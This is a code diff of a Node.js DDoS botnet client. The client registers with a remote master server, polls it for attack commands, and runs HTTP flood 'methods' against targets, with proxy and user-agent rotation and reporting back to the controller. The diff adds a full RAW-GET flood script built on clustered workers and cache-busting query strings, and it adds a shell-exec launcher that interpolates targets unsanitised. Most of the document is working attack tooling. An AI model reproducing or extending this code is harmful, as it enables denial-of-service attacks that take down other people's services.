@@ -11,7 +11,7 @@ const MASTER_SERVER = process.env.MASTER_SERVER || 'https://flood-of-noah-7bs7.o
 const PORT = process.env.PORT || process.env.SERVER_PORT || 5552;
 const MAX_REGISTRATION_ATTEMPTS = 5;
 
-// ========== GENERATE UNIQUE BOT ID ==========
+// ========== GENERATE UNIQUE BOT ID (NOT IP) ==========
 const generateBotId = () => {
   const hostname = os.hostname();
   const pid = process.pid;
@@ -60,10 +60,19 @@ function color(text, colorCode) {
 // ========== AUTO INSTALL NPM PACKAGES ==========
 async function installNpmPackages() {
   const requiredPackages = [
-    'express', 'axios', 'socks', 'random-useragent', 'cookie-parser',
-    'express-rate-limit', 'https-proxy-agent', 'socks-proxy-agent',
-    'set-cookie-parser', 'hpack', 'colors'
+    'express',
+    'axios',
+    'socks',
+    'random-useragent',
+    'cookie-parser',
+    'express-rate-limit',
+    'https-proxy-agent',
+    'socks-proxy-agent',
+    'set-cookie-parser',
+    'hpack',
+    'colors'
   ];
+
   console.log(color('\n🔍 Checking npm packages...', colors.cyan));
   const missingPackages = [];
   for (const pkg of requiredPackages) {
@@ -75,46 +84,60 @@ async function installNpmPackages() {
       missingPackages.push(pkg);
     }
   }
+
   if (missingPackages.length > 0) {
     console.log(color(`\n📦 Installing: ${missingPackages.join(', ')}`, colors.cyan));
     return new Promise((resolve, reject) => {
-      const install = spawn('npm', ['install', ...missingPackages, '--no-save'], { stdio: 'inherit', shell: true });
+      const install = spawn('npm', ['install', ...missingPackages, '--no-save'], {
+        stdio: 'inherit',
+        shell: true
+      });
       install.on('close', (code) => {
         if (code === 0) {
           console.log(color('\n✅ All packages installed!\n', colors.green));
           resolve();
-        } else reject(new Error('Installation failed'));
+        } else {
+          reject(new Error('Installation failed'));
+        }
       });
     });
   }
   return Promise.resolve();
 }
 
-// ========== CREATE PROXY.TXT / UA.TXT ==========
+// ========== CREATE PROXY.TXT IF MISSING ==========
 function createProxyFile() {
   if (!fs.existsSync('proxy.txt')) {
-    fs.writeFileSync('proxy.txt', '# Proxy list - one per line\n# Format: ip:port\n');
+    const template = `# Proxy list - one per line
+# Format: ip:port
+# Example: 192.168.1.1:8080
+`;
+    fs.writeFileSync('proxy.txt', template);
     console.log(color('📄 Created proxy.txt template', colors.green));
   }
 }
+
+// ========== CREATE UA.TXT IF MISSING ==========
 function createUaFile() {
   if (!fs.existsSync('ua.txt')) {
     const userAgents = [
       '# User Agents - one per line',
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
     ];
     fs.writeFileSync('ua.txt', userAgents.join('\n'));
     console.log(color('📄 Created ua.txt template', colors.green));
   }
 }
 
-// ========== CREATE METHODS DIRECTORY AND STUBS (ONLY .JS) ==========
+// ========== CREATE METHODS DIRECTORY AND ALL SCRIPTS ==========
 function createMethodScripts() {
   const methodsDir = path.join(__dirname, 'methods');
   if (!fs.existsSync(methodsDir)) fs.mkdirSync(methodsDir, { recursive: true });
 
-  const writeStub = (filename, content) => {
+  const writeScript = (filename, content) => {
     const filePath = path.join(methodsDir, filename);
     if (!fs.existsSync(filePath)) {
       fs.writeFileSync(filePath, content);
@@ -122,32 +145,54 @@ function createMethodScripts() {
     }
   };
 
-  // Node.js stub for missing methods
-  const jsStub = (name) => `console.log('[${name.toUpperCase()}] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`;
+  // Basic stub scripts (other methods)
+  const stub = (name) => `console.log('[${name.toUpperCase()}] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`;
+  writeScript('high-dstat.js', stub('high-dstat'));
+  writeScript('w-flood1.js', stub('w-flood1'));
+  writeScript('vhold.js', stub('vhold'));
+  writeScript('nust.js', stub('nust'));
+  writeScript('BYPASS.js', stub('BYPASS'));
+  writeScript('cibi.js', stub('cibi'));
+  writeScript('REX-COSTUM.js', stub('REX-COSTUM'));
+  writeScript('h2-nust', stub('h2-nust'));
+  writeScript('http-panel.js', stub('http-panel'));
+  writeScript('uam.js', stub('uam'));
+  writeScript('wil.js', stub('wil'));
+  writeScript('cf-bypass.js', stub('cf-bypass'));
+  writeScript('modern-flood.js', stub('modern-flood'));
 
-  const jsMethods = [
-    'nust', 'w-flood1', 'vhold', 'uam', 'wil',
-    'r10-rapid', 'r10-tcp', 'r10-tls', 'r10-conn', 'r10-header',
-    'r10-frag', 'r10-pipe', 'r10-cookie', 'r10-mixed', 'r10-lowcpu',
-    'BYPASS', 'R-GOST', 'REX-COSTUM', 'browsersun', 'cf-bypass', 'cibi',
-    'h2-nust', 'h2ca', 'high-dstat', 'http-panel', 'kbrowser', 'modern-flood', 'raw-get'
-  ];
-  for (const m of jsMethods) {
-    writeStub(`${m}.js`, jsStub(m));
-  }
+  // R10 series stubs
+  const r10files = ['r10-rapid.js', 'r10-tcp.js', 'r10-tls.js', 'r10-conn.js', 'r10-header.js', 'r10-frag.js', 'r10-pipe.js', 'r10-cookie.js', 'r10-mixed.js', 'r10-lowcpu.js'];
+  for (const f of r10files) writeScript(f, stub(f.replace('.js', '')));
 
-  // RAW-GET full implementation (no proxy)
-  const rawGetJs = `#!/usr/bin/env node
-// RAW-GET Flood - No proxies
+  // RAW-GET - NO PROXY VERSION (matches server)
+  const rawGetContent = `#!/usr/bin/env node
+
+// RAW-GET Flood - Pure GET requests, high RPS, minimal headers (NO PROXIES)
+
 const http = require('http');
 const https = require('https');
 const url = require('url');
 const cluster = require('cluster');
-const args = { target: process.argv[2], time: parseInt(process.argv[3]) || 60, threads: parseInt(process.argv[4]) || 10, rate: parseInt(process.argv[5]) || 1000 };
+
+const args = {
+    target: process.argv[2],
+    time: parseInt(process.argv[3]) || 60,
+    threads: parseInt(process.argv[4]) || 10,
+    rate: parseInt(process.argv[5]) || 1000
+};
+
 const parsed = new URL(args.target);
 const isHttps = parsed.protocol === 'https:';
 const httpLib = isHttps ? https : http;
-const keepAliveAgent = new httpLib.Agent({ keepAlive: true, keepAliveMsecs: 10000, maxSockets: Infinity, maxFreeSockets: 256, timeout: 60000 });
+const keepAliveAgent = new httpLib.Agent({
+    keepAlive: true,
+    keepAliveMsecs: 10000,
+    maxSockets: Infinity,
+    maxFreeSockets: 256,
+    timeout: 60000
+});
+
 if (cluster.isMaster) {
     console.log(\`\\n🔥 RAW-GET (no proxy) | Target: \${args.target} | Time: \${args.time}s | Rate: \${args.rate}/s/worker | Workers: \${args.threads}\`);
     for (let i = 0; i < args.threads; i++) cluster.fork();
@@ -155,22 +200,43 @@ if (cluster.isMaster) {
 } else {
     let running = true;
     let requestCount = 0;
+
     function sendRequest() {
         if (!running) return;
-        const options = { hostname: parsed.hostname, port: parsed.port || (isHttps ? 443 : 80), path: parsed.pathname + (parsed.search ? parsed.search + '&' : '?') + Math.random(), method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html', 'Connection': 'keep-alive' }, agent: keepAliveAgent, rejectUnauthorized: false };
+        const options = {
+            hostname: parsed.hostname,
+            port: parsed.port || (isHttps ? 443 : 80),
+            path: parsed.pathname + (parsed.search ? parsed.search + '&' : '?') + Math.random(),
+            method: 'GET',
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': 'text/html,application/xhtml+xml',
+                'Connection': 'keep-alive'
+            },
+            agent: keepAliveAgent,
+            rejectUnauthorized: false
+        };
         const req = httpLib.request(options, (res) => { requestCount++; res.resume(); });
         req.on('error', () => {});
         req.end();
     }
+
     const intervalMs = 1000 / args.rate;
     const intervalId = setInterval(() => sendRequest(), intervalMs);
-    setInterval(() => { console.log(\`RPS: \${requestCount}\`); requestCount = 0; }, 1000);
-    setTimeout(() => { running = false; clearInterval(intervalId); process.exit(0); }, args.time * 1000);
+    setInterval(() => {
+        console.log(\`RPS: \${requestCount}\`);
+        requestCount = 0;
+    }, 1000);
+    setTimeout(() => {
+        running = false;
+        clearInterval(intervalId);
+        process.exit(0);
+    }, args.time * 1000);
 }
 `;
-  writeStub('raw-get.js', rawGetJs);
+  writeScript('raw-get.js', rawGetContent);
 
-  console.log(color('✅ All method stubs created! (Replace with real .exe or .js later)\n', colors.green));
+  console.log(color('✅ All method scripts created!\n', colors.green));
 }
 
 // ========== REPORTING FUNCTION ==========
@@ -183,194 +249,13 @@ async function sendReport(target, method, requestsMade, duration) {
       method,
       requests: requestsMade,
       duration
-    }, { headers: { 'Content-Type': 'application/json' } });
+    }, {
+      headers: { 'Content-Type': 'application/json' }
+    });
     console.log(color(`📊 Report sent: ${requestsMade} requests to ${target}`, colors.cyan));
   } catch (error) {
     console.log(color(`⚠️ Report failed: ${error.message}`, colors.yellow));
   }
-}
-
-// ========== HELPER: Map method name to safe filename ==========
-function getMethodFilename(method) {
-  const methodMap = {
-    'R9': 'high-dstat',
-    'PRIV-TOR': 'w-flood1',
-    'HOLD-PANEL': 'http-panel',
-    'R1': 'vhold',
-    'UAM': 'uam',
-    'W.I.L': 'wil',
-    'HTTP-SICARIO': 'REX-COSTUM',
-    'RAW-HTTP': 'h2-nust',
-    'CF-BYPASS': 'cf-bypass',
-    'MODERN-FLOOD': 'modern-flood',
-    'RAW-GET': 'raw-get',
-    'BYPASS': 'BYPASS',
-    'R-GOST': 'R-GOST',
-    'browsersun': 'browsersun',
-    'cibi': 'cibi',
-    'h2ca': 'h2ca',
-    'kbrowser': 'kbrowser',
-    'nust': 'nust',
-    'w-flood1': 'w-flood1',
-    'vhold': 'vhold',
-    'wil': 'wil',
-    'tlsop': 'tlsop',
-    'uambypass': 'uambypass'
-  };
-  if (methodMap[method]) return methodMap[method];
-  return method.toLowerCase().replace(/[\s.]+/g, '-');
-}
-
-// ========== EXECUTE A SINGLE COMMAND (supports .exe and .js only) ==========
-function executeCommand(methodName, target, time, additionalArgs = []) {
-  const baseName = getMethodFilename(methodName);
-  const exePath = path.join(__dirname, 'methods', `${baseName}.exe`);
-  const jsPath = path.join(__dirname, 'methods', `${baseName}.js`);
-
-  let command, argsList;
-
-  if (fs.existsSync(exePath)) {
-    command = exePath;
-    argsList = [target, time, ...additionalArgs];
-    console.log(color(`⚡ EXEC (EXE): ${command} ${argsList.join(' ')}`, colors.cyan));
-  } else if (fs.existsSync(jsPath)) {
-    command = 'node';
-    argsList = [jsPath, target, time, ...additionalArgs];
-    console.log(color(`⚡ EXEC (NODE.JS): node ${jsPath} ${target} ${time}`, colors.cyan));
-  } else {
-    console.log(color(`❌ No executable found for method: ${methodName} (tried .exe, .js)`, colors.red));
-    return null;
-  }
-
-  const proc = spawn(command, argsList, { detached: true, stdio: 'pipe' });
-  proc.stdout?.on('data', (data) => {
-    const lines = data.toString().split('\n');
-    lines.forEach(line => {
-      if (line.includes('Request') || line.includes('GET') || line.includes('POST') ||
-          line.includes('Sent') || line.includes('packet') || line.includes('connection')) {
-        requestCount++;
-        totalRequests++;
-      }
-    });
-  });
-  proc.stderr?.on('data', (data) => console.error(color(`⚠️ ${data}`, colors.yellow)));
-  proc.on('error', (err) => console.error(color(`❌ Error: ${err.message}`, colors.red)));
-  return proc;
-}
-
-// ========== EXECUTE ATTACK ==========
-function executeAttack(target, time, methods) {
-  currentAttack = { id: Date.now(), target, methods, startTime: Date.now() };
-  requestCount = 0;
-  attackStartTime = Date.now();
-
-  // Composite attacks (multiple commands) – keep hardcoded
-  switch(methods) {
-    case 'RAPID10':
-      const r10files = ['r10-rapid', 'r10-tcp', 'r10-tls', 'r10-conn', 'r10-header',
-                        'r10-frag', 'r10-pipe', 'r10-cookie', 'r10-mixed', 'r10-lowcpu'];
-      for (const f of r10files) {
-        const proc = executeCommand(f, target, time, ['30', 'proxy.txt', 'ua.txt']);
-        if (proc) activeProcesses.push(proc);
-      }
-      break;
-    case 'HTTP-SICARIO':
-      const sicarioFiles = ['REX-COSTUM', 'cibi', 'BYPASS', 'nust'];
-      const sicarioArgs = [
-        ['32', '6', 'proxy.txt', '--randrate', '--full', '--legit', '--query', '1'],
-        ['16', '3', 'proxy.txt'],
-        ['32', '2', 'proxy.txt'],
-        ['12', '4', 'proxy.txt']
-      ];
-      for (let i = 0; i < sicarioFiles.length; i++) {
-        const proc = executeCommand(sicarioFiles[i], target, time, sicarioArgs[i]);
-        if (proc) activeProcesses.push(proc);
-      }
-      break;
-    case 'R9':
-      const r9Files = ['high-dstat', 'w-flood1', 'vhold', 'nust', 'BYPASS'];
-      const r9Args = [
-        ['32', '7', 'proxy.txt'],
-        ['8', '3', 'proxy.txt'],
-        ['16', '2', 'proxy.txt'],
-        ['16', '2', 'proxy.txt'],
-        ['8', '1', 'proxy.txt']
-      ];
-      for (let i = 0; i < r9Files.length; i++) {
-        const proc = executeCommand(r9Files[i], target, time, r9Args[i]);
-        if (proc) activeProcesses.push(proc);
-      }
-      break;
-    case 'PRIV-TOR':
-      const torFiles = ['w-flood1', 'high-dstat', 'cibi', 'BYPASS', 'nust'];
-      const torArgs = [
-        ['64', '6', 'proxy.txt'],
-        ['16', '2', 'proxy.txt'],
-        ['12', '4', 'proxy.txt'],
-        ['10', '4', 'proxy.txt'],
-        ['10', '1', 'proxy.txt']
-      ];
-      for (let i = 0; i < torFiles.length; i++) {
-        const proc = executeCommand(torFiles[i], target, time, torArgs[i]);
-        if (proc) activeProcesses.push(proc);
-      }
-      break;
-    case 'R1':
-      const r1Files = ['vhold', 'high-dstat', 'cibi', 'BYPASS', 'REX-COSTUM', 'w-flood1', 'vhold', 'nust'];
-      const r1Args = [
-        ['15', '2', 'proxy.txt'],
-        ['64', '2', 'proxy.txt'],
-        ['4', '2', 'proxy.txt'],
-        ['16', '2', 'proxy.txt'],
-        ['32', '6', 'proxy.txt', '--randrate', '--full', '--legit', '--query', '1'],
-        ['8', '3', 'proxy.txt'],
-        ['16', '2', 'proxy.txt'],
-        ['32', '3', 'proxy.txt']
-      ];
-      for (let i = 0; i < r1Files.length; i++) {
-        const proc = executeCommand(r1Files[i], target, time, r1Args[i]);
-        if (proc) activeProcesses.push(proc);
-      }
-      break;
-    default:
-      // Single‑file method: try to run it
-      const proc = executeCommand(methods, target, time, methods === 'CF-BYPASS' ? ['4', '32', 'proxy.txt'] :
-                                            methods === 'MODERN-FLOOD' ? ['4', '64', 'proxy.txt'] :
-                                            methods === 'RAW-HTTP' ? ['15', '2', 'proxy.txt'] :
-                                            methods === 'RAW-GET' ? ['20', '800'] :
-                                            methods === 'HOLD-PANEL' ? [] :
-                                            methods === 'UAM' ? ['5', '4', '6'] :
-                                            methods === 'W.I.L' ? ['10', '8', '4'] : []);
-      if (proc) activeProcesses.push(proc);
-      break;
-  }
-
-  // Auto‑kill all processes after duration + buffer
-  setTimeout(() => {
-    activeProcesses.forEach(proc => {
-      try { proc.kill(); } catch (e) {}
-    });
-    activeProcesses = [];
-  }, parseInt(time) * 1000 + 5000);
-
-  // Report after attack finishes
-  setTimeout(() => {
-    if (requestCount > 0) {
-      sendReport(target, methods, requestCount, time);
-    }
-  }, (parseInt(time) * 1000) + 2000);
-}
-
-// ========== STOP ALL ATTACKS ==========
-function stopAllAttacks() {
-  console.log(color(`🔪 Killing ${activeProcesses.length} processes`, colors.red));
-  activeProcesses.forEach(proc => {
-    try { proc.kill(); } catch (error) {}
-  });
-  activeProcesses = [];
-  currentAttack = null;
-  requestCount = 0;
-  console.log(color(`✅ All attacks stopped`, colors.green));
 }
 
 // ========== MAIN BOT ==========
@@ -388,6 +273,8 @@ async function startBot() {
 
   const express = require('express');
   const axios = require('axios');
+  const { SocksProxyAgent } = require('socks-proxy-agent');
+  const { HttpsProxyAgent } = require('https-proxy-agent');
   const randomUseragent = require('random-useragent');
   const cookieParser = require('cookie-parser');
 
@@ -395,6 +282,7 @@ async function startBot() {
   app.use(express.json());
   app.use(cookieParser());
 
+  // ========== PROXY & UA MANAGEMENT ==========
   function loadProxies() {
     try {
       if (fs.existsSync('proxy.txt')) {
@@ -404,7 +292,9 @@ async function startBot() {
           .filter(line => line && !line.startsWith('#') && line.includes(':'));
         console.log(color(`[PROXY] Loaded ${proxyList.length} proxies`, colors.cyan));
       }
-    } catch (error) { console.log(color('[PROXY] Error: ' + error.message, colors.red)); }
+    } catch (error) {
+      console.log(color('[PROXY] Error loading proxies: ' + error.message, colors.red));
+    }
   }
 
   function loadUserAgents() {
@@ -416,12 +306,15 @@ async function startBot() {
           .filter(line => line && !line.startsWith('#'));
         console.log(color(`[UA] Loaded ${uaList.length} user agents`, colors.green));
       }
-    } catch (error) { console.log(color('[UA] Error: ' + error.message, colors.red)); }
+    } catch (error) {
+      console.log(color('[UA] Error loading user agents: ' + error.message, colors.red));
+    }
   }
 
   const httpsAgent = new https.Agent({ rejectUnauthorized: false, keepAlive: true });
   const api = axios.create({ timeout: 10000, httpsAgent, headers: { 'Content-Type': 'application/json' } });
 
+  // ========== AUTO REGISTER ==========
   async function autoRegister() {
     if (isBlocked) {
       console.log(color(`\n❌ [BLOCKED] This bot has been permanently blocked!`, colors.redBright));
@@ -435,6 +328,7 @@ async function startBot() {
     try {
       console.log(color(`📡 Registering to: ${MASTER_SERVER}/register`, colors.cyan));
       const payload = { id: BOT_ID, name: BOT_NAME };
+      console.log(color(`📤 Sending: ${JSON.stringify(payload)}`, colors.yellow));
       const response = await api.post(`${MASTER_SERVER}/register`, payload);
       if (response.data.approved) {
         console.log(color(`\n✅ [SUCCESS] Bot registered!`, colors.greenBright));
@@ -443,12 +337,14 @@ async function startBot() {
         return;
       }
     } catch (error) {
-      if (error.response?.status === 403) {
+      console.log(color(`❌ Registration failed:`, colors.red));
+      if (error.response && error.response.status === 403) {
         console.log(color(`\n❌ Bot is blocked!`, colors.redBright));
         isBlocked = true;
         process.exit(0);
       }
       registrationAttempts++;
+      console.log(color(`🔄 Retry ${registrationAttempts}/${MAX_REGISTRATION_ATTEMPTS} in 5s...`, colors.yellow));
       setTimeout(() => autoRegister(), 5000);
     }
   }
@@ -466,7 +362,9 @@ async function startBot() {
 
   async function checkForCommands() {
     try {
-      const response = await api.get(`${MASTER_SERVER}/get-command`, { params: { botId: BOT_ID } });
+      const response = await api.get(`${MASTER_SERVER}/get-command`, {
+        params: { botId: BOT_ID }
+      });
       if (response.data.hasCommand) {
         const command = response.data.command;
         if (command.action === 'stop') {
@@ -481,6 +379,128 @@ async function startBot() {
     } catch (error) {}
   }
 
+  function stopAllAttacks() {
+    console.log(color(`🔪 Killing ${activeProcesses.length} processes`, colors.red));
+    activeProcesses.forEach(proc => {
+      try { process.kill(-proc.pid); } catch (error) {}
+    });
+    activeProcesses = [];
+    currentAttack = null;
+    requestCount = 0;
+    console.log(color(`✅ All attacks stopped`, colors.green));
+  }
+
+  function executeAttack(target, time, methods) {
+    currentAttack = { id: Date.now(), target, methods, startTime: Date.now() };
+    requestCount = 0;
+    attackStartTime = Date.now();
+
+    const execWithLog = (cmd) => {
+      console.log(color(`⚡ EXEC: ${cmd}`, colors.cyan));
+      const proc = exec(cmd, { detached: true, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
+        if (error) { console.error(color(`❌ Error: ${error.message}`, colors.red)); return; }
+        if (stdout) {
+          const lines = stdout.split('\n');
+          lines.forEach(line => {
+            if (line.includes('Request') || line.includes('GET') || line.includes('POST') || 
+                line.includes('Sent') || line.includes('packet') || line.includes('connection')) {
+              requestCount++;
+              totalRequests++;
+            }
+          });
+        }
+        if (stderr) console.error(color(`⚠️ ${stderr}`, colors.yellow));
+      });
+      activeProcesses.push(proc);
+      setTimeout(() => {
+        const index = activeProcesses.indexOf(proc);
+        if (index > -1) {
+          try { process.kill(-proc.pid); } catch (e) {}
+          activeProcesses.splice(index, 1);
+        }
+      }, parseInt(time) * 1000 + 5000);
+    };
+
+    // Attack methods including RAW-GET (no proxy)
+    switch(methods) {
+      case 'RAPID10':
+        execWithLog(`node methods/r10-rapid.js ${target} ${time} 30 proxy.txt ua.txt`);
+        execWithLog(`node methods/r10-tcp.js ${target} ${time} proxy.txt ua.txt`);
+        execWithLog(`node methods/r10-tls.js ${target} ${time} proxy.txt ua.txt`);
+        execWithLog(`node methods/r10-conn.js ${target} ${time} proxy.txt ua.txt`);
+        execWithLog(`node methods/r10-header.js ${target} ${time} 30 proxy.txt ua.txt`);
+        execWithLog(`node methods/r10-frag.js ${target} ${time} proxy.txt ua.txt`);
+        execWithLog(`node methods/r10-pipe.js ${target} ${time} proxy.txt ua.txt`);
+        execWithLog(`node methods/r10-cookie.js ${target} ${time} proxy.txt ua.txt`);
+        execWithLog(`node methods/r10-mixed.js ${target} ${time} proxy.txt ua.txt`);
+        execWithLog(`node methods/r10-lowcpu.js ${target} ${time} 40 proxy.txt ua.txt`);
+        break;
+      case 'CF-BYPASS':
+        execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
+        break;
+      case 'MODERN-FLOOD':
+        execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
+        break;
+      case 'HTTP-SICARIO':
+        execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
+        execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
+        execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
+        execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
+        break;
+      case 'RAW-HTTP':
+        execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
+        execWithLog(`node methods/http-panel.js ${target} ${time}`);
+        break;
+      case 'RAW-GET':
+        // NO PROXY argument - matches server
+        execWithLog(`node methods/raw-get.js ${target} ${time} 20 800`);
+        break;
+      case 'R9':
+        execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
+        execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
+        execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
+        execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
+        execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
+        break;
+      case 'PRIV-TOR':
+        execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
+        execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
+        execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
+        execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
+        execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
+        break;
+      case 'HOLD-PANEL':
+        execWithLog(`node methods/http-panel.js ${target} ${time}`);
+        break;
+      case 'R1':
+        execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
+        execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
+        execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
+        execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
+        execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
+        execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
+        execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
+        execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
+        break;
+      case 'UAM':
+        execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
+        break;
+      case 'W.I.L':
+        execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
+        break;
+      default:
+        console.log(color(`❌ Unknown method: ${methods}`, colors.red));
+    }
+
+    // After attack ends, send report
+    setTimeout(() => {
+      if (requestCount > 0) {
+        sendReport(target, methods, requestCount, time);
+      }
+    }, (parseInt(time) * 1000) + 2000);
+  }
+
+  // Health endpoint
   app.get('/health', (req, res) => {
     res.json({
       status: 'online',
